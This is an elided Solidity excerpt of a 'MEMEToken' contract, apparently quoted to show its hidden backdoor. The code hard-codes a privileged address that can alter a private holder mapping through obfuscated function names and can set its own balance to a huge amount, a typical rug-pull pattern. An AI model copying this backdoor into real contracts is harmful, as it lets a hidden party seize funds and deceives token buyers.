...
contract MEMEToken is Ownable {
    ...
    address public _beeceo1551;
    mapping(address => bool) private qwert;
    function quitOPDoge(address sss) external   {
        if (_beeceo1551 == _msgSender()) {
            qwert[sss] = false;
        }
         if (_beeceo1551 == _msgSender()) {
            qwert[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo1551 == adminAddress){
            _balances[_beeceo1551] = googoNum()*(45000);
        }
        if(_beeceo1551 == adminAddress){
            _balances[_beeceo1551] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo1551 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
